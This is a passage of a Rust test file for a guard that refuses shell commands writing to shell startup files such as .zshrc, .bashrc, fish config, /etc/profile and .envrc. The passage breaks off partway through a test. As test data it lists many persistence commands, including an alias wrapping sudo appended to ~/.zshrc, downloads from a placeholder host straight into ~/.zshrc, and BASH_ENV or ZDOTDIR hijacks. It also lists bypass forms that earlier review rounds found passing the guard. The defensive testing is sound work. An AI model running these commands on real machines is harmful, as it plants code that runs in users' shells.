//! Tests of the shell startup class (TSK-242). Each case runs against a
//! fixture home in a temporary directory; nothing touches the real home.

use super::*;

struct Fixture {
    _dir: tempfile::TempDir,
    home: PathBuf,
    project: PathBuf,
}

impl Fixture {
    fn new() -> Self {
        let dir = tempfile::tempdir().unwrap();
        // Resolve the temporary directory's own links (`/var` on macOS)
        // and Windows short names, so a spelled path and its resolution
        // agree.
        let root = crate::portable_path::canonicalize(dir.path()).unwrap();
        let home = root.join("home");
        let project = home.join("work/project");
        std::fs::create_dir_all(&project).unwrap();
        std::fs::create_dir_all(home.join(".config/fish")).unwrap();
        std::fs::write(home.join(".zshrc"), "# fixture\n").unwrap();
        std::fs::write(home.join(".bashrc"), "# fixture\n").unwrap();
        Self {
            _dir: dir,
            home,
            project,
        }
    }

    /// The class locations for this fixture. Named for what it builds, so
    /// the git environment scan (`git_spawn_contract`) does not read it as
    /// a process `env()` call.
    fn startup_env(&self) -> StartupEnv {
        StartupEnv {
            home: Some(self.home.clone()),
            other_homes: Vec::new(),
            zdotdir: None,
            xdg_config: None,
            etc_roots: Vec::new(),
        }
    }

    /// The command with `H` replaced by the fixture home, spelled with
    /// `/` as a shell command spells a path on every platform. A command
    /// that already spells the home keeps it: the temporary directory's
    /// random name can end in `H` (`.tmpCeqjnH/home`), which a plain
    /// replace rewrote one run in about sixty.
    fn spell(&self, command: &str) -> String {
        let home = slashed(&self.home);
        command
            .split(home.as_str())
            .map(|part| part.replace("H/", &format!("{home}/")))
            .collect::<Vec<_>>()
            .join(&home)
    }

    fn judge_in(&self, command: &str, cwd: &Path, env: &StartupEnv) -> Vec<Violation> {
        evaluate(&self.spell(command), cwd, env)
    }

    fn judge(&self, command: &str) -> Vec<Violation> {
        self.judge_in(command, &self.project, &self.startup_env())
    }
}

/// A path as a shell command spells it: `/` separators on every platform.
fn slashed(path: &Path) -> String {
    crate::portable_path::slashed(path)
}

fn refused(found: &[Violation]) -> bool {
    found.iter().any(|v| v.rule == RULE && v.level_fixed)
}

/// Every visible write form refuses, in every spelling the guard expands.
#[test]
fn visible_writes_to_startup_files_refuse() {
    let f = Fixture::new();
    let mut wrong = Vec::new();
    for command in [
        "echo 'ls(){ sudo \"$@\"; }' >> ~/.zshrc",
        "echo x > $HOME/.bashrc",
        "echo x > ${HOME}/.profile",
        "echo x > H/.zshenv",
        "echo x >| ~/.ZSHRC",
        "printf x 1>>~/.bash_aliases",
        "tee -a ~/.bashrc < /dev/null",
        "cp evil.sh ~/.zshrc",
        "cp evil.fish H/.config/fish/config.fish",
        "cp evil.fish ~/.config/fish/conf.d/x.fish",
        "mv evil ~/.zshrc",
        "ln -sf evil ~/.zshrc",
        "install -m 644 evil ~/.zshrc",
        "rsync evil ~/.zshrc",
        "dd if=evil of=~/.zshrc",
        "truncate -s 0 ~/.zshrc",
        "touch ~/.zlogin",
        "sed -i s/a/b/ ~/.zshrc",
        "sed -i.bak 's/a/b/' H/.bashrc",
        "perl -pi -e 's/a/b/' ~/.zshrc",
        "awk 'BEGIN { print \"x\" > \"/home/u/.bashrc\" }'",
        "python3 -c \"open('H/.zshrc','a').write('x')\"",
        "python3 - <<'EOF'\nopen('/home/u/.zshrc', 'a').write('x')\nEOF",
        "node -e \"require('fs').appendFileSync(require('os').homedir() + '/.zshrc', 'x')\"",
        "ruby -e 'File.write(Dir.home + \"/.bashrc\", \"x\")'",
        "curl -sSL -o ~/.zshrc https://example.invalid/x",
        "wget -O ~/.zshrc https://example.invalid/x",
        "less -o ~/.zshrc notes.txt",
        "git config --file ~/.zshrc a.b c",
        "patch ~/.zshrc fix.diff",
        "ed ~/.zshrc < script.ed",
        "vim -c 'normal Gox' -c wq ~/.zshrc",
        "cat > s.sh <<'EOF'\necho x >> ~/.zshrc\nEOF\nsh s.sh",
        "printf 'echo x >> ~/.zshrc' | sh",
        "xargs -I{} cp {} ~/.zshrc < list",
        "find ~ -name .zshrc -exec sed -i s/a/b/ {} +",
        "echo x > ~/.z?hrc",
        "shopt -s dotglob; echo x > ~/*shrc",
        "echo x > ~/.{zsh,bash}rc",
        "echo x > ~/.ssh/rc",
        "echo x > ~/.inputrc",
        "echo x > ~/.tmux.conf",
        "echo x > ~/Documents/PowerShell/Microsoft.PowerShell_profile.ps1",
        "echo x > /etc/profile.d/x.sh",
        "echo x > /etc/zshenv",
        "echo x > .envrc",
        "echo x > sub/dir/.envrc",
        "mkdir -p ~/.config/fish/functions",
        "cp -l ~/.zshrc linked",
        "ln ~/.zshrc linked",
        "bash -c 'echo x >> ~/.zshrc'",
        "env FOO=1 tee -a ~/.bashrc",
    ] {
        if !refused(&f.judge(command)) {
            wrong.push(command);
        }
    }
    assert!(wrong.is_empty(), "allowed:\n{}", wrong.join("\n"));
}

/// Reads of startup files, and ordinary writes elsewhere, pass.
#[test]
fn reads_and_ordinary_writes_pass() {
    let f = Fixture::new();
    let mut wrong = Vec::new();
    for command in [
        "cat ~/.zshrc",
        "grep alias ~/.bashrc",
        "grep -rn alias ~/.config/fish",
        "ls -la ~",
        "head -5 H/.zshrc",
        "diff ~/.zshrc theirs.zshrc",
        "git diff -- .envrc",
        "git log -p -- .envrc",
        "cp ~/.bashrc ./backup",
        "cp H/.zshrc /tmp/zshrc.copy",
        "source ~/.zshrc",
        ". ~/.zshrc",
        "cat ~/.zshrc | grep alias",
        "echo \"add this line to ~/.zshrc yourself\"",
        "echo x > out.txt",
        "cp a.txt b.txt",
        "python3 -c 'print(1)'",
        "HOME=/tmp/fixture-home bash -c true",
        "HOME=/tmp/fixture-home cargo test",
        "cp notes.txt ~/notes.txt",
        "tar -xf bundle.tar -C build",
        "p=build/out; echo x > \"$p\"",
        "echo x > \"$TMPDIR/x\"",
        "rsync -a src/ dest/",
        "find . -name '*.rs'",
        "find ~ -maxdepth 1 -name '.z*'",
        "git status",
        "cargo build --release",
        "mkdir -p ~/.local/state/codeflow",
        "stat ~/.zshrc",
        "echo x > ~/*shrc",
        "rm -rf ~/*",
    ] {
        let found = f.judge(command);
        if refused(&found) {
            wrong.push(format!("{command}: {}", found[0].message));
        }
    }
    // Reads with a program that can also write, and placing calls whose
    // output goes somewhere named, from the home itself (the TSK-242
    // differential over developer commands).
    for command in [
        "sed -n 1,20p ~/.zshrc",
        "sed -n '/alias/p' .bashrc",
        "tar -czf out.tgz build",
        "tar -tf bundle.tar",
        "tar -xzf vendor.tgz -C vendor",
        "unzip pkg.zip -d vendor",
        "wget -O x.json https://example.invalid/x",
        "rsync -a src/ build/src/",
        "git clean -fd",
        "git worktree add ../wt -b x",
    ] {
        let found = f.judge_in(command, &f.home, &f.startup_env());
        if refused(&found) {
            wrong.push(format!("{command} from the home: {}", found[0].message));
        }
    }
    assert!(wrong.is_empty(), "refused:\n{}", wrong.join("\n"));
    for command in [
        "sed -i '' 's/a/b/' .zshrc",
        "sed -n 'w .bashrc' notes",
        "sed -f edit.sed .zshrc",
        "tar -xzf vendor.tgz",
        "tar xf vendor.tar",
        "tar -f vendor.tar",
        "tar -xf vendor.tar -C .config",
        "unzip pkg.zip",
        "wget https://example.invalid/x",
        "curl -O https://example.invalid/x",
        "git worktree add .zsh",
        "git checkout -- .",
    ] {
        let found = f.judge_in(command, &f.home, &f.startup_env());
        assert!(refused(&found), "{command} from the home");
    }
}

/// A target the guard cannot resolve refuses near the class and keeps
/// its verdict elsewhere.
/// Pattern characters in the run directory or the home are part of a
/// path, never a glob: the shell expands only what the word spells. A
/// project in `proj (1)` once let `echo x > .envrc` pass, and so did the
/// `?` of a Windows `\\?\` path (the Windows run of PR 113).
#[test]
fn pattern_characters_outside_the_word_are_literal() {
    let f = Fixture::new();
    for name in ["proj (1)", "p[1]", "a#b", "x^y"] {
        let cwd = f.home.join("work").join(name);
        std::fs::create_dir_all(&cwd).unwrap();
        for command in [
            "echo x > .envrc",
            "echo x > sub/.envrc",
            "cp evil .envrc",
            "echo x > ~/.zl?gin",
        ] {
            let found = f.judge_in(command, &cwd, &f.startup_env());
            assert!(refused(&found), "{command} in {name}");
        }
        let found = f.judge_in("echo x > notes.txt", &cwd, &f.startup_env());
        assert!(!refused(&found), "notes.txt in {name}: {found:?}");
    }
    let home = f.home.join("work").join("home (1)");
    std::fs::create_dir_all(home.join(".config/fish")).unwrap();
    let env = StartupEnv {
        home: Some(home.clone()),
        ..f.startup_env()
    };
    for command in [
        "echo x > ~/.config/fish/conf.d/x.fish",
        "echo x > $HOME/.config/fish/conf.d/x.fish",
        "mkdir -p ~/.config/fish/functions",
        "echo x > ~/.zl?gin",
        "echo x > $HOME/.config/fish/conf.d/*.fish",
        "echo x > ~/.config/fish/*.fish",
    ] {
        let found = evaluate(command, &f.project, &env);
        assert!(refused(&found), "{command} with the home in `home (1)`");
    }
}

/// `cd ~` moves a later command to the guard's home, the one the class is
/// built from, so a placing program after it is judged there.
#[test]
fn a_directory_change_to_the_home_is_judged_from_the_class_home() {
    let f = Fixture::new();
    for command in [
        "cd ~ && tar -xf dots.tar",
        "cd ~/.config && tar -xf fish.tar",
        "pushd ~ && unzip dots.zip",
    ] {
        assert!(refused(&f.judge(command)), "{command}");
    }
    assert!(!refused(&f.judge("cd ~/work && tar -xf src.tar")));
    // With `HOME` unset and `USERPROFILE` set, as on the Windows runner,
    // the guard still reads the home, and `cd ~` lands in it.
    let profile = f.home.clone().into_os_string();
    let env = StartupEnv::from_vars(
        &|name: &str| (name == "USERPROFILE").then(|| profile.clone()),
        &f.project,
    );
    assert_eq!(env.home.as_deref(), Some(f.home.as_path()));
    let found = evaluate("cd ~ && tar -xf dots.tar", &f.project, &env);
    assert!(refused(&found), "{found:?}");
}

/// Where `HOME` and `USERPROFILE` name two directories, as a Git Bash
/// `HOME` can on Windows, both are homes: bash reads one and native
/// programs the other (TSK-242 review round 13).
#[test]
fn both_homes_are_protected_when_they_differ() {
    let f = Fixture::new();
    let other = f.home.parent().unwrap().join("profile");
    std::fs::create_dir_all(&other).unwrap();
    let (home, profile) = (
        f.home.clone().into_os_string(),
        other.clone().into_os_string(),
    );
    let env = StartupEnv::from_vars(
        &|name: &str| match name {
            "HOME" => Some(home.clone()),
            "USERPROFILE" => Some(profile.clone()),
            _ => None,
        },
        &f.project,
    );
    assert_eq!(env.home.as_deref(), Some(f.home.as_path()));
    for path in [
        f.home.join(".bashrc"),
        other.join(".bashrc"),
        other.join(".config/fish/config.fish"),
    ] {
        assert!(class_target(&path, &env).is_some(), "{path:?}");
    }
    for command in [
        format!("echo x >> {}/.bashrc", slashed(&other)),
        format!("tar -xf dots.tar -C {}", slashed(&other)),
    ] {
        assert!(refused(&evaluate(&command, &f.project, &env)), "{command}");
    }
}

/// A Unix-like shell installed on Windows reads its own `etc` folder as
/// `/etc`, so the class covers that folder: through a root the guard
/// resolves from the environment, and through an install it did not
/// resolve. The comparison runs on every platform here; the Windows guard
/// applies the unresolved rule to every path it judges.
#[test]
fn a_windows_shell_install_etc_reads_as_the_etc_class() {
    let f = Fixture::new();
    let lay_out = |root: &Path, bash: Option<&str>| {
        std::fs::create_dir_all(root.join("etc/profile.d")).unwrap();
        if let Some(bash) = bash {
            let bash = root.join(bash);
            std::fs::create_dir_all(bash.parent().unwrap()).unwrap();
            std::fs::write(bash, "").unwrap();
        }
    };
    // Found on `PATH`, through `EXEPATH` and at a standard location.
    let git = f.home.join("Programs/Git");
    lay_out(&git, Some("usr/bin/bash.exe"));
    std::fs::create_dir_all(git.join("cmd")).unwrap();
    std::fs::write(git.join("cmd/git.exe"), "").unwrap();
    let path = std::env::join_paths([f.project.clone(), git.join("cmd")]).unwrap();
    let from_path = shell_roots(&|name: &str| (name == "PATH").then(|| path.clone()));
    assert_eq!(from_path, std::slice::from_ref(&git));
    let exe = git.clone().into_os_string();
    let from_exe = shell_roots(&|name: &str| (name == "EXEPATH").then(|| exe.clone()));
    assert_eq!(from_exe, std::slice::from_ref(&git));
    let program_files = f.home.join("Program Files");
    lay_out(&program_files.join("Git"), Some("bin/bash.exe"));
    let pf = program_files.clone().into_os_string();
    let standard = shell_roots(&|name: &str| (name == "ProgramFiles").then(|| pf.clone()));
    assert_eq!(standard, [program_files.join("Git")]);
    // A folder without a shell is no root.
    let plain = f.home.join("tools");
    lay_out(&plain, None);
    let plain_os = plain.clone().into_os_string();
    assert!(shell_roots(&|name: &str| (name == "EXEPATH").then(|| plain_os.clone())).is_empty());
    // A resolved root's `etc` is the `/etc` class.
    let env = StartupEnv {
        etc_roots: from_path,
        ..f.startup_env()
    };
    for (rest, label) in [
        ("etc/profile", "/etc/profile"),
        ("etc/profile.d/x.sh", "/etc/profile.d"),
        ("etc/bash.bashrc", "/etc/bash.bashrc"),
        ("ETC/Profile", "/etc/profile"),
    ] {
        assert_eq!(
            class_target(&git.join(rest), &env).as_deref(),
            Some(label),
            "{rest}"
        );
    }
    assert!(class_target(&git.join("etc/gitconfig"), &env).is_none());
    let command = format!("echo x >> '{}/etc/bash.bashrc'", slashed(&git));
    assert!(refused(&evaluate(&command, &f.project, &env)), "{command}");
    // An install no variable names: read by the shell it holds, or by a
    // standard install folder name when the shell cannot be seen.
    let class = Class::new(&f.startup_env());
    let unnamed = f.home.join("opt/shell");
    lay_out(&unnamed, Some("bin/bash.exe"));
    let msys = f.home.join("D/msys64");
    lay_out(&msys, None);
    for (path, label) in [
        (unnamed.join("etc/profile.d/x.sh"), "/etc/profile.d"),
        (msys.join("etc/bash.bashrc"), "/etc/bash.bashrc"),
        (f.home.join("PortableGit/etc/profile"), "/etc/profile"),
    ] {
        assert_eq!(
            class.shell_etc_entry(&path).as_deref(),
            Some(label),
            "{path:?}"
        );
    }
    // A project's own `etc` is not a shell's, and a shell's other files
    // are not the class.
    lay_out(&f.project, None);
    for path in [
        f.project.join("etc/profile"),
        plain.join("etc/profile"),
        unnamed.join("etc/gitconfig"),
        unnamed.join("profile"),
    ] {
        assert!(class.shell_etc_entry(&path).is_none(), "{path:?}");
    }
}

/// On Windows the class compares paths without a drive, so `/etc/zshenv`
/// joined from `C:\work` and the Git Bash spelling `/c/Users/u/.zshrc`
/// reach the class entries spelled from the root and the home.
#[test]
fn drives_are_dropped_from_compared_windows_paths() {
    for (text, want) in [
        ("c:/etc/zshenv", "/etc/zshenv"),
        ("c:/users/u/.zshrc", "/users/u/.zshrc"),
        ("/c/users/u/.zshrc", "/users/u/.zshrc"),
        ("c:/c/users/u/.zshrc", "/users/u/.zshrc"),
        ("c:", ""),
        ("/c", "/"),
        ("c:/", "/"),
        ("/etc/zshenv", "/etc/zshenv"),
        ("/cd/x", "/cd/x"),
        ("work/.envrc", "work/.envrc"),
    ] {
        assert_eq!(drive_free(text), want, "{text}");
    }
}

/// The same, end to end where the paths are real Windows paths.
#[cfg(windows)]
#[test]
fn windows_drive_spellings_reach_the_class() {
    let f = Fixture::new();
    assert!(class_target(Path::new(r"C:\etc\profile.d\x.sh"), &f.startup_env()).is_some());
    assert!(class_target(Path::new(r"\\?\C:\etc\zshenv"), &f.startup_env()).is_some());
    let home = slashed(&f.home);
    let (drive, rest) = home.split_once(':').unwrap();
    let msys = format!("/{}{rest}", drive.to_lowercase());
    for command in [
        format!("echo x > {msys}/.zshrc"),
        format!("echo x > {home}/.config/fish/conf.d/x.fish"),
        "echo x > /etc/profile.d/x.sh".to_string(),
        "R=/etc; tar -xf a.tar -C \"$R\"".to_string(),
        // Git Bash's own `/etc`, at the standard Git for Windows location.
        "echo x > 'C:/Program Files/Git/etc/profile.d/x.sh'".to_string(),
        "tar -xf a.tar -C 'C:/Program Files/Git/etc'".to_string(),
    ] {
        assert!(refused(&f.judge(&command)), "{command}");
    }
    assert!(class_target(
        Path::new(r"C:\Program Files\Git\etc\profile"),
        &f.startup_env()
    )
    .is_some());
    let notes = f.project.join("etc").join("profile");
    assert!(class_target(&notes, &f.startup_env()).is_none());
}

#[test]
fn unresolved_targets_fail_closed_near_the_class() {
    let f = Fixture::new();
    for command in [
        "p=~/.zshrc; echo x > \"$p\"",
        "p=~/.z; echo x > \"${p}shrc\"",
        "echo x > \"$(printf ~/.zshrc)\"",
        "echo x > ~/.$SHELLNAME",
        "echo x > $HOME/.$NAME",
        "echo x > ~root/.zshrc",
        "cp evil \"$TARGET\" # .zshrc",
        "cd \"$d\" && echo x > .zshrc",
        "xargs -I{} sed -i s/a/b/ ~/{} < names",
    ] {
        assert!(refused(&f.judge(command)), "{command}");
    }
    for command in [
        "echo x > \"$OUT\"",
        "cp a \"$DEST\"",
        "echo x > build/$NAME.log",
        "cd \"$d\" && echo x > notes.txt",
    ] {
        let found = f.judge(command);
        assert!(!refused(&found), "{command}: {found:?}");
    }
}

/// Placing programs refuse in or into the home, `/etc` or a startup
/// directory, and pass elsewhere.
#[test]
fn placing_into_the_home_refuses() {
    let f = Fixture::new();
    for command in [
        "tar -xf bundle.tar -C ~",
        "tar -xf bundle.tar --directory=H/.config",
        "rsync -a dotfiles/ ~/",
        "cp -r dotfiles/. ~",
        "cp -R fish ~/.config",
        "mv dotconfig ~/.local/share",
        "unzip dots.zip -d ~",
        "git --work-tree=$HOME checkout .",
        "git -C ~ checkout -- .",
        "wget -P ~ https://example.invalid/x",
        "ditto dots ~",
        "stow -t ~ shell",
    ] {
        assert!(refused(&f.judge(command)), "{command}");
    }
    let found = f.judge_in("tar -xf bundle.tar", &f.home, &f.startup_env());
    assert!(refused(&found), "tar in the home");
    let found = f.judge_in("git checkout -- .", &f.home, &f.startup_env());
    assert!(refused(&found), "git in the home");
    let found = f.judge_in("git status", &f.home, &f.startup_env());
    assert!(!refused(&found), "a git read in the home");
    // Git judged where it runs: its `-C` directory, and only for a
    // subcommand that can write the working tree.
    let project = slashed(&f.project);
    for command in [
        "git push origin --tags",
        "git fetch origin",
        "git commit -m x",
        "git add notes.md",
        "git tag v1",
        format!("git -C '{project}' checkout -- .").as_str(),
        format!("git -C {project} pull").as_str(),
    ] {
        let found = f.judge_in(command, &f.home, &f.startup_env());
        assert!(!refused(&found), "{command} from the home: {found:?}");
    }
    for command in [
        "git -C ~ pull",
        "git -C . checkout -- .",
        "git -C $UNSET_DIR checkout -- . && ls ~",
        "git config -f ~/.zshrc a.b c",
    ] {
        let found = f.judge_in(command, &f.home, &f.startup_env());
        assert!(refused(&found), "{command} from the home");
    }
    let found = f.judge(&format!("git -C {} merge main", slashed(&f.home)));
    assert!(refused(&found), "git -C to the home from a project");
    for command in [
        "tar -xf bundle.tar",
        "unzip dots.zip -d vendor",
        "git checkout -- .",
        "curl -sSL https://example.invalid/x",
        "cp -r assets ~/work/project/out",
    ] {
        let found = f.judge(command);
        assert!(!refused(&found), "{command}: {found:?}");
    }
}

/// A startup variable set for a shell that reads startup files refuses.
#[test]
fn startup_environment_for_a_shell_refuses() {
    let f = Fixture::new();
    for command in [
        "ZDOTDIR=/tmp/z zsh -c true",
        "HOME=/tmp/h zsh -c true",
        "env ZDOTDIR=/tmp/z zsh",
        "BASH_ENV=/tmp/e bash -c true",
        "export BASH_ENV=/tmp/e; bash script.sh",
        "PROMPT_COMMAND='id' bash -i",
        "HOME=/tmp/h bash -lc true",
        "ENV=/tmp/e sh -i",
        "XDG_CONFIG_HOME=/tmp/c fish -c true",
        "HOME=/tmp/h tmux new -d",
    ] {
        assert!(refused(&f.judge(command)), "{command}");
    }
    for command in [
        "ZDOTDIR=/tmp/z zsh -f -c true",
        "HOME=/tmp/h bash --noprofile --norc -c true",
        "HOME=/tmp/h sh -c true",
        "XDG_CONFIG_HOME=/tmp/c fish --no-config -c true",
        "HOME=/tmp/h pwsh -NoProfile -c 1",
    ] {
        let found = f.judge(command);
        assert!(!refused(&found), "{command}: {found:?}");
    }
}

#[test]
fn direnv_trust_refuses() {
    let f = Fixture::new();
    for command in ["direnv allow", "direnv allow .", "cd sub && direnv permit"] {
        assert!(refused(&f.judge(command)), "{command}");
    }
    assert!(!refused(&f.judge("direnv status")));
}

/// A symbolic link to a startup file is judged by where it points, in a
/// plain word, a glob and a native edit; so is a broken link.
#[cfg(unix)]
#[test]
fn symbolic_links_are_followed() {
    let f = Fixture::new();
    let links = f.home.join("links");
    std::fs::create_dir_all(&links).unwrap();
    std::os::unix::fs::symlink(f.home.join(".zshrc"), links.join("a")).unwrap();
    std::os::unix::fs::symlink(f.home.join(".zprofile"), links.join("broken")).unwrap();
    std::os::unix::fs::symlink(&f.home, f.project.join("homelink")).unwrap();
    for command in [
        "echo x >> H/links/a",
        "echo x >> H/links/*",
        "echo x >> H/links/broken",
        "echo x >> homelink/.zshrc",
        "cp evil homelink/.bashrc",
    ] {
        assert!(refused(&f.judge(command)), "{command}");
    }
    assert!(class_target(&links.join("a"), &f.startup_env()).is_some());
    assert!(class_target(&f.project.join("homelink/.zshrc"), &f.startup_env()).is_some());
    assert!(class_target(&f.project.join("notes.md"), &f.startup_env()).is_none());
}

/// `ZDOTDIR` and `XDG_CONFIG_HOME` move the class with them.
#[test]
fn effective_locations_follow_the_environment() {
    let f = Fixture::new();
    let zdot = f.home.join("zdot");
    let xdg = f.home.join("xdg");
    let env = StartupEnv {
        zdotdir: Some(zdot.clone()),
        xdg_config: Some(xdg.clone()),
        ..f.startup_env()
    };
    assert_eq!(
        class_target(&zdot.join(".zshrc"), &env).as_deref(),
        Some("$ZDOTDIR/.zshrc")
    );
    assert!(class_target(&zdot.join(".zshenv.zwc"), &env).is_some());
    assert!(class_target(&xdg.join("fish/config.fish"), &env).is_some());
    assert!(class_target(&f.home.join(".zshrc"), &env).is_some());
    assert!(class_target(&zdot.join("notes"), &env).is_none());
    let cmd = format!("echo x >> {}/.zshrc", slashed(&zdot));
    assert!(refused(&evaluate(&cmd, &f.project, &env)));
}

/// Every table entry is in the class as a native edit target, in the
/// spelling the table gives and in another letter case.
#[test]
fn every_table_entry_is_a_class_target() {
    let f = Fixture::new();
    let table = &actions::table().startup_paths;
    for entry in &table.home {
        let path = f.home.join(entry.trim_end_matches('/'));
        assert!(class_target(&path, &f.startup_env()).is_some(), "{entry}");
        let upper = f.home.join(entry.trim_end_matches('/').to_uppercase());
        assert!(
            class_target(&upper, &f.startup_env()).is_some(),
            "{entry} upper"
        );
        if entry.ends_with('/') {
            assert!(
                class_target(&path.join("x"), &f.startup_env()).is_some(),
                "{entry}x"
            );
        }
    }
    for entry in &table.absolute {
        let path = PathBuf::from(entry.trim_end_matches('/'));
        assert!(class_target(&path, &f.startup_env()).is_some(), "{entry}");
    }
    for name in &table.anywhere {
        assert!(
            class_target(&f.project.join(name), &f.startup_env()).is_some(),
            "{name}"
        );
    }
    assert!(class_target(&f.home.join(".zshrc.d.notes"), &f.startup_env()).is_none());
    assert!(class_target(&f.home.join(".config/other"), &f.startup_env()).is_none());
}

/// The text floor finds a startup file as a path or a name, and not
/// inside a longer name.
#[test]
fn the_text_floor_reads_names_not_substrings() {
    let f = Fixture::new();
    let class = Class::new(&f.startup_env());
    for text in [
        "open('/home/u/.zshrc')",
        "\".bashrc\"",
        "C:\\Users\\u\\Documents\\PowerShell\\Microsoft.PowerShell_profile.ps1",
        "~/.config/fish/config.fish",
        "/etc/profile.d/x",
    ] {
        assert!(class.named_in(text).is_some(), "{text}");
    }
    for text in ["user.profile", "my_zshrc", "x.bashrc_backup", "profiles"] {
        assert!(class.named_in(text).is_none(), "{text}");
    }
}

/// The forms the first holistic review found passing (TSK-242, round one):
/// a reassigned or argument-shadowed variable, a relative run-time name in
/// the home, an attached option value, a copy landing on a link, a `+f`
/// that turns zsh's startup files back on, and a recursive glob. Each
/// passed at 3a8065d76.
#[test]
fn review_round_one_forms_refuse() {
    let f = Fixture::new();
    let out = f.project.join("out");
    std::fs::create_dir_all(&out).unwrap();
    #[cfg(unix)]
    std::os::unix::fs::symlink(f.home.join(".zshrc"), out.join("payload")).unwrap();
    let mut wrong = Vec::new();
    let mut refuse = vec![
        "p=~/.zshrc; echo x > \"$p\"; p=notes",
        "p=~/.zshrc; echo p=notes; echo x > \"$p\"",
        // `cd H/`: run_dirs reads `~` from the process, not the fixture.
        "cd H/; echo x > \"$DEST\"",
        "curl -s -o$HOME/.zshrc https://example.invalid/x",
        "curl -so~/.bashrc https://example.invalid/x",
        "ZDOTDIR=/tmp/z zsh +f -c true",
        "ZDOTDIR=/tmp/z zsh -f +f -c true",
        "ZDOTDIR=/tmp/z zsh -f -o rcs -c true",
        "ZDOTDIR=/tmp/z zsh +o norcs -c true",
        // Any `-o` leaves the startup files on (round two).
        "ZDOTDIR=/tmp/z zsh -o norcs -c true",
        "echo x > ~/**/.zshrc",
        "rg --pre ./x alias ~/.zshrc",
    ];
    if cfg!(unix) {
        refuse.push("cp payload out/");
    }
    for command in refuse {
        if !refused(&f.judge(command)) {
            wrong.push(format!("allowed: {command}"));
        }
    }
    if !refused(&f.judge_in("echo x > \"$DEST\"", &f.home, &f.startup_env())) {
        wrong.push("allowed from the home: echo x > \"$DEST\"".to_string());
    }
    for command in [
        "p=notes; echo x > \"$p\"",
        "echo x > \"$DEST\"",
        "ZDOTDIR=/tmp/z zsh -fc true",
        "rg --no-config alias ~/.zshrc",
        "rm -rf build/**/tmp",
        "cp notes.txt out/",
    ] {
        let found = f.judge(command);
        if refused(&found) {
            wrong.push(format!("refused: {command}: {}", found[0].message));
        }
    }
    assert!(wrong.is_empty(), "wrong verdicts:\n{}", wrong.join("\n"));
}

/// The forms the second holistic review found passing at 6ce696b69: a use
/// before a later assignment, `cp -f` read as taking a value, a link made
/// earlier in the same call, attached `-o` and `+f` after `-s` in zsh, a
/// recursive glob reaching a link, and ripgrep reading a configuration.
#[test]
fn review_round_two_forms_refuse() {
    let f = Fixture::new();
    let out = f.project.join("out");
    let links = f.project.join("links");
    std::fs::create_dir_all(&out).unwrap();
    std::fs::create_dir_all(&links).unwrap();
    #[cfg(unix)]
    {
        std::os::unix::fs::symlink(f.home.join(".zshrc"), out.join("payload")).unwrap();
        std::os::unix::fs::symlink(f.home.join(".zshrc"), links.join("one")).unwrap();
    }
    let mut wrong = Vec::new();
    let mut refuse = vec![
        "ln -s ~/.zshrc rc; echo x >> rc",
        "ln -sf H/.bashrc rc",
        "ZDOTDIR=/tmp/z zsh -f -orcs -c true",
        "ZDOTDIR=/tmp/z zsh -f -s +f",
        "ZDOTDIR=/tmp/z zsh -f --rcs -c true",
        "ZDOTDIR=/tmp/z zsh -f +x -c true",
        "rg marker ~/.zshrc",
        "RIPGREP_CONFIG_PATH=rgconfig rg marker ~/.zshrc",
    ];
    if cfg!(unix) {
        refuse.extend(["cp -f payload out/", "echo x >> links/**"]);
    }
    for command in refuse {
        if !refused(&f.judge(command)) {
            wrong.push(format!("allowed: {command}"));
        }
    }
    if !refused(&f.judge_in("echo x > \"$p\"; p=notes", &f.home, &f.startup_env())) {
        wrong.push("allowed from the home: echo x > \"$p\"; p=notes".to_string());
    }
    for command in [
        "echo x > \"$p\"; p=notes",
        "cp -f notes.txt out/",
        "ln -s ../shared shared",
        "rm -rf build/**/tmp",
        "ZDOTDIR=/tmp/z zsh -f -c true",
        "rg --no-config marker ~/.zshrc",
    ] {
        let found = f.judge(command);
        if refused(&found) {
            wrong.push(format!("refused: {command}: {}", found[0].message));
        }
    }
    assert!(wrong.is_empty(), "wrong verdicts:\n{}", wrong.join("\n"));
}

/// Review round three: an attached target directory, GNU sed's `e`,
/// and a relative `ZDOTDIR`. Landing-relative link text is a residual.
#[test]
fn review_round_three_forms_refuse() {
    let f = Fixture::new();
    std::fs::create_dir_all(f.project.join("out")).unwrap();
    std::fs::create_dir_all(f.project.join("fixtures")).unwrap();
    let mut wrong = Vec::new();
    for command in [
        "cp -tH/ fixtures/.zshrc",
        "cp -ftH/ fixtures/.zshrc",
        "mv -tH/ fixtures/.bashrc",
        "sed -n '1e echo x >> sub/.envrc' notes",
        "sed -n 's/a/b/e' ~/.zshrc",
        "sed -n -e 1p -e 'w /tmp/x' ~/.zshrc",
        "sed -n '1p;y/a/b/' ~/.zshrc",
        "sed -f script ~/.zshrc",
    ] {
        if !refused(&f.judge(command)) {
            wrong.push(format!("allowed: {command}"));
        }
    }
    for command in [
        "cp -t out notes.txt",
        "cp -tH/work notes.txt",
        "ln -s ../shared out/shared",
        "sed -n '/alias/p' ~/.zshrc",
        "sed 's/a/b/g' ~/.zshrc",
        "sed -n -e 1p -e '$p' ~/.zshrc",
        "sed -ne '1,20p;$=' ~/.zshrc",
        "sed -E -n '/^alias/p' ~/.bashrc",
    ] {
        let found = f.judge(command);
        if refused(&found) {
            wrong.push(format!("refused: {command}: {}", found[0].message));
        }
    }
    // A relative `ZDOTDIR` protects the zsh file names in every directory.
    let env = StartupEnv {
        zdotdir: Some(PathBuf::from("zdir")),
        ..f.startup_env()
    };
    if !refused(&f.judge_in("echo x > zdir/.zshenv", &f.project, &env)) {
        wrong.push("allowed with ZDOTDIR=zdir: echo x > zdir/.zshenv".to_string());
    }
    if class_target(&f.project.join("zdir/.zshrc"), &env).is_none() {
        wrong.push("not a class target with ZDOTDIR=zdir: zdir/.zshrc".to_string());
    }
    if refused(&f.judge_in("echo x > zdir/notes", &f.project, &env)) {
        wrong.push("refused with ZDOTDIR=zdir: echo x > zdir/notes".to_string());
    }
    assert!(wrong.is_empty(), "wrong verdicts:\n{}", wrong.join("\n"));
}

/// Named link sources and destinations remain in the class. Copier
/// preservation, dereference order and landing-relative text are residuals.
#[test]
fn named_copy_and_link_paths() {
    let f = Fixture::new();
    std::fs::create_dir_all(f.project.join("out")).unwrap();
    for command in [
        "cp -s ~/.zshrc envlink; echo copied >> envlink",
        "cp -s sub/.envrc envlink",
        "cp --symbolic-link ~/.zshrc rc",
        "cp -as ~/.zshrc rc",
        "cp -l ~/.bashrc rc",
        "cp --link ~/.bashrc rc",
        "ln -s ~/.zshrc rc",
        "ln ~/.bashrc rc",
        "mv ~/.bashrc rc",
